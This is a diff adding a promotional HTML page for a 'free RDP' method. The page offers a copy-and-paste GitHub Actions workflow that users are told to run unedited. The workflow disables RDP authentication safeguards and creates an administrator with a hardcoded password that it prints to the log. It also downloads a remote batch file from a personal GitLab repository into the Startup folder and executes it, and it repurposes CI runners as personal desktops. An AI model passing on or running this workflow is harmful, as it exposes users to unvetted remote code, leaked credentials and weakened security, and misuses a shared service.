@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>New RDP — Latest Method | HamzaEditz 2.0</title>
+<meta name="description" content="The newest free RDP method — Windows + Tailscale. Watch the full video guide, then copy the ready-made workflow code.">
+<meta name="theme-color" content="#070a12">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop offset='0' stop-color='%2334d399'/%3E%3Cstop offset='.5' stop-color='%2322d3ee'/%3E%3Cstop offset='1' stop-color='%23a78bfa'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='100' height='100' rx='26' fill='url(%23g)'/%3E%3Crect x='27' y='25' width='11' height='50' rx='4' fill='white'/%3E%3Crect x='62' y='25' width='11' height='50' rx='4' fill='white'/%3E%3Crect x='38' y='44' width='24' height='11' rx='4' fill='white'/%3E%3Cpath d='M46 38.5v23l20-11.5z' fill='%230b101d'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="hamza-ui.css"><script src="hamza-ui.js" defer></script><script src="hamza-ads.js" defer></script>
+<style>
+.hz-wrap{max-width:980px;margin:0 auto;padding:10px 22px 20px}
+.hz-sec{background:var(--hz-card);border:1px solid var(--hz-line);border-radius:20px;padding:24px;margin-top:26px;box-shadow:var(--hz-shadow)}
+.hz-sec h2{margin:0 0 8px;font-size:1.25rem}
+.hz-sec p{color:var(--hz-muted);line-height:1.65;margin:0 0 6px}
+.hz-vid{display:block;position:relative;border-radius:16px;overflow:hidden;border:1px solid var(--hz-line);text-decoration:none;margin-top:14px}
+.hz-vid img{width:100%;display:block;border-radius:0;aspect-ratio:16/9;object-fit:cover}
+.hz-vid .hz-play{position:absolute;inset:0;display:grid;place-items:center;background:linear-gradient(180deg,transparent 40%,rgba(4,6,12,.55))}
+.hz-vid .hz-pbtn{width:76px;height:76px;border-radius:50%;background:#ff0033;display:grid;place-items:center;box-shadow:0 18px 40px -8px rgba(255,0,51,.65);animation:hzPulse 1.8s ease-in-out infinite}
+.hz-vid .hz-pbtn svg{width:30px;height:30px;fill:#fff;margin-left:4px}
+.hz-vid .hz-vtitle{position:absolute;left:0;right:0;bottom:0;padding:38px 18px 14px;color:#fff;font-weight:700;font-size:.98rem;line-height:1.4;background:linear-gradient(transparent,rgba(4,6,12,.82))}
+.hz-vid .hz-yt{position:absolute;top:12px;right:12px;background:rgba(4,6,12,.75);color:#fff;font-size:.72rem;font-weight:800;letter-spacing:.06em;padding:6px 11px;border-radius:99px;border:1px solid rgba(255,255,255,.25)}
+.hz-steps{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:16px}
+.hz-step{background:var(--hz-card);border:1px solid var(--hz-line);border-radius:16px;padding:16px}
+.hz-step b{display:flex;align-items:center;gap:9px;margin-bottom:6px;font-size:.95rem}
+.hz-step b i{font-style:normal;width:26px;height:26px;flex:none;border-radius:9px;display:grid;place-items:center;background:var(--hz-grad);color:#fff;font-size:.8rem}
+.hz-step span{color:var(--hz-muted);font-size:.88rem;line-height:1.55;display:block}
+@media(max-width:680px){.hz-steps{grid-template-columns:1fr}}
+.hz-codebar{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-bottom:12px}
+.hz-codebar .hz-fname{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.82rem;color:var(--hz-fg2);word-break:break-all}
+.hz-copy{padding:11px 20px;font-size:.9rem}
+.hz-codebox{max-height:520px;overflow:auto;border-radius:14px;border:1px solid var(--hz-line)}
+.hz-codebox pre{margin:0;border:0;border-radius:0;background:rgba(0,0,0,.28)!important;padding:18px;font-size:.8rem;line-height:1.6}
+.hz-codebox code{background:none!important;border:0;padding:0;color:var(--hz-fg2);white-space:pre;font-family:ui-monospace,Menlo,Consolas,monospace}
+.hz-note{margin-top:14px;font-size:.86rem;color:var(--hz-muted)}
+.hz-copied{font-size:.85rem;color:var(--hz-accent);font-weight:700;opacity:0;transition:.3s}
+.hz-copied.on{opacity:1}
+</style>
+</head>
+<body>
+<div class="hz-wrap">
+
+<section class="hz-sec">
+<h2>Watch the full method — step by step</h2>
+<p>Tap the video and it opens in the <strong>YouTube app</strong> (not inside the browser), so you can follow along properly. The complete workflow code is right below the video.</p>
+<a class="hz-vid" href="https://www.youtube.com/watch?v=XNv-2O7kLDE" target="_blank" rel="noopener" aria-label="Watch on YouTube">
+<img src="https://i.ytimg.com/vi/XNv-2O7kLDE/hqdefault.jpg" alt="Free GitHub RDP Cloud PC video thumbnail" loading="lazy">
+<span class="hz-yt">WATCH ON YOUTUBE</span>
+<span class="hz-play"><span class="hz-pbtn"><svg viewBox="0 0 24 24"><path d="M8 5.5v13l11-6.5z"/></svg></span></span>
+<span class="hz-vtitle">Free GitHub RDP Cloud PC For Unlimited Days | 16GB RAM and 200GB+ Storage Cloud PC</span>
+</a>
+<div class="hz-steps">
+<div class="hz-step"><b><i>1</i>Watch the video</b><span>See the complete method first — repo setup, workflow run and Tailscale connection, exactly as shown.</span></div>
+<div class="hz-step"><b><i>2</i>Copy the code</b><span>Use the Copy Code button below. The code is the exact, complete workflow file — nothing removed.</span></div>
+<div class="hz-step"><b><i>3</i>Run it on GitHub</b><span>Paste it as your workflow file, run the workflow, and connect to your RDP with the Tailscale IP from the run.</span></div>
+</div>
+</section>
+
+<section class="hz-sec">
+<div class="hz-codebar">
+<span class="hz-fname">win + tailscale + Download.bat script.yml</span>
+<span style="display:flex;align-items:center;gap:12px"><span class="hz-copied" id="hzCopied">Copied</span><button type="button" class="hz-copy" onclick="hzCopyCode(this)">Copy Code</button></span>
+</div>
+<div class="hz-codebox"><pre><code id="rdpCode">name: win 11 + tailscale + Download.bat script 
+
+on:
+  workflow_dispatch:
+
+jobs:
+  secure-rdp:
+    runs-on: windows-2022
+    timeout-minutes: 350
+
+    steps:
+      - name: Configure Core RDP Settings
+        run: |
+          # Enable Remote Desktop and disable Network Level Authentication (if needed)
+          Set-ItemProperty -Path &#x27;HKLM:\System\CurrentControlSet\Control\Terminal Server&#x27; `
+                             -Name &quot;fDenyTSConnections&quot; -Value 0 -Force
+          Set-ItemProperty -Path &#x27;HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#x27; `
+                             -Name &quot;UserAuthentication&quot; -Value 0 -Force
+          Set-ItemProperty -Path &#x27;HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#x27; `
+                             -Name &quot;SecurityLayer&quot; -Value 0 -Force
+
+          # Remove any existing rule with the same name to avoid duplication
+          netsh advfirewall firewall delete rule name=&quot;RDP-Tailscale&quot;
+         
+          # For testing, allow any incoming connection on port 3389
+          netsh advfirewall firewall add rule name=&quot;RDP-Tailscale&quot; `
+            dir=in action=allow protocol=TCP localport=3389
+
+          # (Optional) Restart the Remote Desktop service to ensure changes take effect
+          Restart-Service -Name TermService -Force
+
+      - name: Create RDP User with Fixed Password
+        run: |
+          $password = &quot;MR.English2008&quot;
+          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+          if (-not (Get-LocalUser -Name &quot;RDP&quot; -ErrorAction SilentlyContinue)) {
+              New-LocalUser -Name &quot;RDP&quot; -Password $securePass -AccountNeverExpires
+          }
+          Add-LocalGroupMember -Group &quot;Administrators&quot; -Member &quot;RDP&quot;
+          Add-LocalGroupMember -Group &quot;Remote Desktop Users&quot; -Member &quot;RDP&quot;
+         
+          echo &quot;RDP_CREDS=User: RDP | Password: $password&quot; &gt;&gt; $env:GITHUB_ENV
+         
+          if (-not (Get-LocalUser -Name &quot;RDP&quot;)) {
+              Write-Error &quot;User creation failed&quot;
+              exit 1
+          }
+
+      - name: Install Tailscale
+        run: |
+          $tsUrl = &quot;https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi&quot;
+          $installerPath = &quot;$env:TEMP\tailscale.msi&quot;
+         
+          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
+          Start-Process msiexec.exe -ArgumentList &quot;/i&quot;, &quot;`&quot;$installerPath`&quot;&quot;, &quot;/quiet&quot;, &quot;/norestart&quot; -Wait
+          Remove-Item $installerPath -Force
+
+      - name: Establish Tailscale Connection
+        run: |
+          # Bring up Tailscale with the provided auth key and set a unique hostname
+          &amp; &quot;$env:ProgramFiles\Tailscale\tailscale.exe&quot; up --authkey=${{ secrets.TAILSCALE_AUTHKEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
+         
+          # Wait for Tailscale to assign an IP
+          $tsIP = $null
+          $retries = 0
+          while (-not $tsIP -and $retries -lt 10) {
+              $tsIP = &amp; &quot;$env:ProgramFiles\Tailscale\tailscale.exe&quot; ip -4
+              Start-Sleep -Seconds 5
+              $retries++
+          }
+         
+          if (-not $tsIP) {
+              Write-Error &quot;Tailscale IP not assigned. Exiting.&quot;
+              exit 1
+          }
+          echo &quot;TAILSCALE_IP=$tsIP&quot; &gt;&gt; $env:GITHUB_ENV
+     
+      - name: Verify RDP Accessibility
+        run: |
+          Write-Host &quot;Tailscale IP: $env:TAILSCALE_IP&quot;
+         
+          # Test connectivity using Test-NetConnection against the Tailscale IP on port 3389
+          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
+          if (-not $testResult.TcpTestSucceeded) {
+              Write-Error &quot;TCP connection to RDP port 3389 failed&quot;
+              exit 1
+          }
+          Write-Host &quot;TCP connectivity successful!&quot;
+
+      - name: Maintain Connection + Watch RDP User
+        run: |
+          Write-Host &quot;`n=== RDP ACCESS ===&quot;
+          Write-Host &quot;Address: $env:TAILSCALE_IP&quot;
+          Write-Host &quot;Username: RDP&quot;
+          Write-Host &quot;Password: $(echo $env:RDP_CREDS)&quot;
+          Write-Host &quot;==================`n&quot;
+
+          $rdpProfile = &quot;C:\Users\RDP&quot;
+          $startupPath = &quot;$rdpProfile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&quot;
+          $downloadUrl = &quot;https://gitlab.com/MR.English2008/pcme_rdp/-/raw/main/Downloads.bat&quot;
+          $downloadPath = &quot;$startupPath\Downloads.bat&quot;
+
+          while ($true) {
+              if (Test-Path $rdpProfile) {
+                  try {
+                      if (-not (Test-Path $startupPath)) {
+                          New-Item -ItemType Directory -Path $startupPath -Force | Out-Null
+                      }
+
+                      Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -UseBasicParsing
+                      Write-Host &quot;✅ Downloads.bat copied to $downloadPath&quot;
+
+                      # Run the batch file for the first time
+                      cmd /c $downloadPath
+                      Write-Host &quot;✅ Downloads.bat executed successfully&quot;
+                      break
+                  }
+                  catch {
+                      Write-Host &quot;❌ Error copying or executing Downloads.bat: $($_.Exception.Message)&quot;
+                      break
+                  }
+              }
+              else {
+                  Write-Host &quot;[$(Get-Date)] Waiting for RDP profile to be created...&quot;
+                  Start-Sleep -Seconds 30
+              }
+          }
+
+          # Keep runner alive
+          while ($true) {
+              Write-Host &quot;[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate&quot;
+              Start-Sleep -Seconds 300
+          }</code></pre></div>
+<p class="hz-note">This is the exact code from the method file, shown in full. Paste it exactly as it is — do not edit lines unless the video tells you to.</p>
+</section>
+
+</div>
+<script>
+function hzCopyCode(btn){
+  if (window.hzOnCopyAction) { try { window.hzOnCopyAction(); } catch(e){} }
+  var text = document.getElementById('rdpCode').textContent;
+  function done(){ var c = document.getElementById('hzCopied'); c.classList.add('on'); setTimeout(function(){ c.classList.remove('on'); }, 2200); }
+  if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(text).then(done, function(){ hzFallback(); }); }
+  else { hzFallback(); }
+  function hzFallback(){
+    var ta = document.createElement('textarea'); ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); } catch(e){}
+    document.body.removeChild(ta); done();
+  }
+}
+</script>
+</body>
+</html>
